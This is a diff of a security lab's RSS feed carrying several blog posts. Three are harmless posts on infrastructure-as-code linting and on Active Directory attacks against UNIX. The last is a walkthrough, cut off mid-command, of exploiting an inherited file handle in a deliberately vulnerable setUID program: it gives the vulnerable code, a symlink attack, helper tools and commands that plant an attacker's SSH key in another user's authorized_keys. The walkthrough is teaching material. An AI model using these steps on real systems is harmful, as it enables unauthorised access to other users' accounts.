@@ -1,0 +1,1164 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Portcullis Labs &#187; auditing</title>
+	<atom:link href="https://labs.portcullis.co.uk/tag/auditing/feed/" rel="self" type="application/rss+xml" />
+	<link>https://labs.portcullis.co.uk</link>
+	<description>Research and Development</description>
+	<language>en-US</language>
+		<sy:updatePeriod>hourly</sy:updatePeriod>
+		<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>http://wordpress.org/?v=3.8.5</generator>
+	<item>
+		<title>Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</title>
+		<link>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/</link>
+		<comments>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/#comments</comments>
+		<pubDate>Sat, 26 Jan 2019 22:06:06 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[devops]]></category>
+		<category><![CDATA[devsecops]]></category>
+		<category><![CDATA[infradev]]></category>
+		<category><![CDATA[orchestration]]></category>
+		<category><![CDATA[seceng]]></category>
+		<category><![CDATA[secops]]></category>
+		<category><![CDATA[sre]]></category>
+		<category><![CDATA[training]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6839</guid>
+		<description><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the Center for Internet Security&#8216;s Docker benchmark and CoreOS&#8216;s Clair, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Whilst there are some great examples of how to assess infrastructure as code dynamically with things like the <a title="Center for Internet Security" href="https://www.cisecurity.org/">Center for Internet Security</a>&#8216;s <a title="Docker benchmark" href="https://www.cisecurity.org/benchmark/docker/">Docker benchmark</a> and <a title="CoreOS" href="https://github.com/coreos/">CoreOS</a>&#8216;s <a title="Clair" href="https://github.com/coreos/clair">Clair</a>, these kinda run a little too late in the pipeline for my liking. If we want to treat infrastructure as code then surely we ought to be performing code reviews and if we&#8217;re performing code reviews then perhaps we can perform a subset of these checks automatically pre-commit?<span id="more-6839"></span></p>
+<p>Many of the current generation of infrastructure orchestration tools utilise Domain Specific Languages presented through the medium of YAML, JSON etc which allow the infradev team to specify programmatically, the architecture and nature of the infrastructure they manage. Just how secure are these language and where might we find gaps that an offensive party might seek to exploit? In practice, what I was really thinking was, if I want to review commits (automatically), then what exactly do I want my tools to look for and why? This seems like an obvious question but at that point, I hadn&#8217;t seen a huge amount of talk (or more importantly, based on the work I do, evidence) on how others were doing this to review their templates before they&#8217;d been built and deployed&#8230;.</p>
+<p>The good news is that somewhere along the way, whilst I was still asking around and before I started to work on this series of posts, I discovered <a title="cfn_nag" href="https://github.com/stelligent/cfn_nag">cfn_nag</a> which looked like a great start, albeit only if you&#8217;re working on <a title="AWS" href="https://aws.amazon.com/">AWS</a>&#8216;s <a title="CloudFormation" href="https://aws.amazon.com/cloudformation/">CloudFormation</a> platform. Taking inspiration from this discovery, my next search was for a linting tool for Ansible (my preferred choice for infrastructure orchestration) and this too yielded results, namely <a title="ansible-lint" href="https://github.com/ansible/ansible-lint">ansible-lint</a>. It turns out that there is more going on than I&#8217;d originally feared but that if you want to do this kind of thing (and you should), you really want to be looking for linting tools for your preferred templating language. One observation I&#8217;ll make however is that many of these linters don&#8217;t appear to have a regular stream of updates and that they may only support a limited set of checks.</p>
+<p>In the next part of my thought experiment, we’ll take a deeper dive and I&#8217;ll start to consider just how effective these linters are, looking at both the theory of static analysis and code review as it applies to secure development more generally and just as importantly, looking at the assurance these tools can give you.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/">Use Infrastructure as Code they said. Easier to audit they said&#8230; (part 1)</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/use-infrastructure-as-code-they-said-easier-to-audit-they-said-part-1/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>An offensive introduction to Active Directory on UNIX</title>
+		<link>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
+		<comments>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6805</guid>
+		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
+<h2>Background to Active Directory integration solutions</h2>
+<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
+Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
+<ul>
+<li>DNS &#8211; Used for name resolution</li>
+<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
+<li>Kerberos &#8211; Used for ongoing authentication</li>
+<li>SSSD &#8211; Like LSASS</li>
+<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
+</ul>
+<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
+<h2>Our research</h2>
+<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
+<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Where 2 worlds collide: Bringing Mimikatz et al to UNIX</title>
+		<link>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
+		<comments>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
+		<pubDate>Thu, 06 Dec 2018 08:04:06 +0000</pubDate>
+		<dc:creator><![CDATA[TMB]]></dc:creator>
+				<category><![CDATA[Presentations]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[Black Hat Europe]]></category>
+		<category><![CDATA[blue team]]></category>
+		<category><![CDATA[conference]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[hardening]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[UNIX]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6806</guid>
+		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
+<p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
+<p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>
+<p>Tools referenced in this talk include:</p>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz" title="Linikatz">Linikatz</a></li>
+<ul>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/JohnTheRipper" title="JohnTheRipper dynamic.conf rules">JohnTheRipper dynamic.conf rules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/metasploit-framework" title="metasploit-framework post-exploitation modules">metasploit-framework post-exploitation modules</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/blue/audit" title="auditd policies">auditd policies</a></li>
+<li><a href="https://github.com/portcullislabs/linikatz/tree/master/tools/vas/fuzzers" title="fuzzers">fuzzers</a></li>
+</ul>
+</ul>
+<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-1').click();">
+  <div class="icon"><a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://labs.portcullis.co.uk/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
+  <div class="filetitle">
+    <a href="https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-1">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
+    
+    <br />
+    December 6, 2018<br />
+    
+  </div>
+  <div class="info">
+    724.9 KiB<br />
+    MD5 hash: cc712c5e46b16fbff22a2566b1248a91 <br />
+    <a href="#" onclick="return wpfilebase_filedetails(1);">Details</a>
+  </div>
+  <div class="details" id="wpfilebase-filedetails1" style="display: none;">
+  
+  <table border="0">
+   
+   
+   
+   
+   
+   
+   <tr><td><strong>Date:</strong></td><td>December 6, 2018</td></tr>
+  </table>
+  </div>
+ <div style="clear: both;"></div>
+</div>
+<p>The post <a href="https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Exploiting inherited file handles in setUID programs</title>
+		<link>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/</link>
+		<comments>https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/#comments</comments>
+		<pubDate>Thu, 28 Jun 2018 16:00:40 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[analysis]]></category>
+		<category><![CDATA[auditing]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[root]]></category>
+		<category><![CDATA[UNIX]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=6538</guid>
+		<description><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/exploiting-inherited-file-handles-in-setuid-programs/">Exploiting inherited file handles in setUID programs</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is what we&#8217;ll look at in the context of setUID programs on Linux.<span id="more-6538"></span></p>
+<p>I was reminded of this technique as I tackled an <a href="https://exploit-exercises.com/nebula/level11/">old hacker challenge</a> recently. This a fun challenge. And there&#8217;s a much easier solution than using the technique I&#8217;m going to cover here. Maybe try both the hard way and the easy way.</p>
+<h2>Example program</h2>
+<p>Here&#8217;s a fairly minimal test case of example code &#8211; inspired by the nebula challenge code.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv)
+{
+ char *cmd = argv[1];
+ char tmpfilepath[] = &quot;/tmp/tmpfile&quot;;  // Modern systems need &quot;sysctl fs.protected_symlinks=0&quot; or &quot;chmod 0777 /tmp&quot; for this to be vulnerable to the symlink attack we'll use later.
+ char data[] = &quot;pointless data\n&quot;;
+
+int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
+ unlink(tmpfilepath);
+ write(fd, data, strlen(data));
+ setuid(getuid());
+ system(cmd);
+}
+</pre>
+<p>Let&#8217;s start by compiling this and setting the setUID bit so we have an example to work with:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# useradd -m tom # victim/target user
+root@challenge:/# useradd -m bob # attacker
+root@challenge:/# cd ~bob
+root@challenge:/home/bob# cp /share/fd-leak.c .
+root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
+root@challenge:/home/bob# chown tom:tom fd-leak
+root@challenge:/home/bob# chmod 4755 fd-leak
+root@challenge:/home/bob# ls -l fd-leak
+-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+</pre>
+<p>For exploitation later, we&#8217;ll also need the target user (tom in this case) to have a .ssh directory in their home directory:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
+</pre>
+<p>What this program lacks in realism is hopefully made up for in its simplicity.</p>
+<h2>Normal operation</h2>
+<p>As can be seen from the code above, the program should:</p>
+<ol>
+<li>Create the file /tmp/tmpfile, then delete it. A file descriptor is retained</li>
+<li>Drop privileges. This is poor code for dropping privileges, btw. It suffices for this example, though</li>
+<li>Run a command that is supplied as an argument. It should run as the invoking user, not as the target user (tom)</li>
+</ol>
+<p>Let&#8217;s try it out (note that I modify .bashrc to make it clearer to the reader when a subshell has been spawned):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+root@challenge:/home/bob# su - bob
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ./fd-leak bash -p
+subshell...
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+root@challenge:/home/bob# useradd -m tom
+root@challenge:/home/bob# su - tom
+$ mkdir .ssh
+$ ls -la
+total 28
+drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
+drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
+...
+</pre>
+<p>So, yes fd-leak appears to drop privileges. (Our spawned shell isn&#8217;t responsible for the drop in privileges as I&#8217;ve hopefully illustrated by passing -p to bash above and by running id directly).</p>
+<p>Finally, we expect the child process to inherit a file handle to the now deleted file /tmp/tmpfile:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
+lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
+lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
+</pre>
+<p>It does. We&#8217;re all set.</p>
+<h2>High level exploit path</h2>
+<p>Our approach to attacking this vulnerable program will follow these high level steps which are covered in more detail in the sections below:</p>
+<ol>
+<li>Create a symlink that the vulnerable code will try to write to. This way we can create a file in a location of our choosing and with a name we choose. We&#8217;ll choose ~tom/.ssh/authorized_keys</li>
+<li>We&#8217;ll run some code in the context of a child process to manipulate the open file handle so we can write the contents of authorized_keys file</li>
+<li>Finally, we log with via SSH</li>
+</ol>
+<h2>Practical exploitation</h2>
+<h3>Step 1: Symlink attack</h3>
+<p>Simple:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+</pre>
+<p>This step was harder in the nebula challenge, but I didn&#8217;t want to cloud the issue.</p>
+<p>If we run the code now, we see that the authorized_keys file is created, but we don&#8217;t control the contents.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+ln: failed to create symbolic link '/tmp/tmpfile': File exists
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
+</pre>
+<p>We also don&#8217;t control the permissions the file gets created with. (Feel free to try the above on authorized_keys2 after running &#8220;umask 0&#8243; to check).</p>
+<h3>Step 2: Running code in child process</h3>
+<p>It&#8217;s pretty easy to run code because of the nature of the program. Again, this was harder in the nebula challenge. We can see the file handle we want listed in /proc/self/fd. It&#8217;s file descriptor 3:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
+
+bob@challenge:~$ ls -l /tmp/tmpfile
+lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
+bob@challenge:~$ ./fd-leak bash
+subshell...
+bob@challenge:~$ ls -l /proc/self/fd
+total 0
+lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
+lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
+lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
+</pre>
+<p>So we can just &#8220;echo key &gt; /proc/self/fd/3&#8243;? Not really. That&#8217;s just a symlink. A symlink to a file that doesn&#8217;t exist to be precise. And it&#8217;s pointing to a location that we&#8217;d don&#8217;t have privileges to create. Let&#8217;s confirm that:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
+-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
+bob@challenge:~$ id
+uid=1001(bob) gid=1001(bob) groups=1001(bob)
+bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
+bash: /home/tom/.ssh/authorized_keys: Permission denied
+bob@challenge:~$ echo &gt; /tmp/tmpfile
+bash: /tmp/tmpfile: Permission denied
+bob@challenge:~$ echo &gt; /proc/self/fd/3
+bash: /proc/self/fd/3: Permission denied
+</pre>
+<p>We need to write to file descriptor 3&#8230; So is there are version of cat that works with file descriptors? Not that I know of. Let&#8217;s write some small utilities that will help us get to grips with accessing inherited file handles. We&#8217;ll write 3 tools:</p>
+<ul>
+<li>read &#8211; that uses the read function to read a set number of bytes from a particular file descriptor</li>
+<li>write &#8211; that writes a string of our choosing to a particular file descriptor</li>
+<li>lseek &#8211; that lets us position our read/write</li>
+</ul>
+<p>Here&#8217;s the source and compilation of the (very crude) demo tools:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ cat read.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ char buf[1024];
+ memset(buf, 0, 1024);
+ int r = read(atoi(argv[1]), buf, 10);
+ printf(&quot;Read %d bytes\n&quot;, r);
+ write(1, buf, 10);
+}
+
+bob@challenge:~$ gcc -o read read.c
+bob@challenge:~$ cat write.c
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;writing %s to fd %s\n&quot;, argv[2], argv[1]);
+ write(atoi(argv[1]), argv[2], strlen(argv[2]));
+}
+bob@challenge:~$ gcc -o write write.c
+bob@challenge:~$ cat lseek.c
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc, char *argv[]) {
+ printf(&quot;seek to position %s on fd %s\n&quot;, argv[2], argv[1]);
+ lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
+}
+
+bob@challenge:~$ gcc -o lseek lseek.c
+</pre>
+<p>Let&#8217;s see the tools in action. First we try to read, then write to file descriptor 3, but the read always returns 0 bytes:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./read 3
+Read 0 bytes
+bob@challenge:~$ ./write 3 hello
+writing hello to fd 3
+bob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>The reason is that we need to seek to a location in the file that isn&#8217;t the end of the file. Let&#8217;s seek to position 0, the beginning of the file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./read 3
+Read 10 bytes
+pointless bob@challenge:~$ ./read 3
+Read 10 bytes
+data
+hellobob@challenge:~$ ./read 3
+Read 0 bytes
+</pre>
+<p>Much better.</p>
+<p>Finally we need exploit the program above. We have two choices:</p>
+<ul>
+<li>Run a shell as before, then use our new tool to write the key to authorized_keys; or</li>
+<li>Make a new tool using the functions shown above to write to authorized_keys.</li>
+</ul>
+<p>Let&#8217;s do the former. The latter is an exercise for the reader. Note that we need to seek to position 0 before we write our data. It&#8217;s important to overwrite the &#8220;pointless&#8221; message already there as that corrupts the authorized_keys file:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+bob@challenge:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
+Enter passphrase (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in bobkey.
+Your public key has been saved in bobkey.pub.
+bob@challenge:~$ cat bobkey.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
+bob@challenge:~$ ls -l bobkey.pub
+-rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
+bob@challenge:~$ ./lseek 3 0
+seek to position 0 on fd 3
+bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
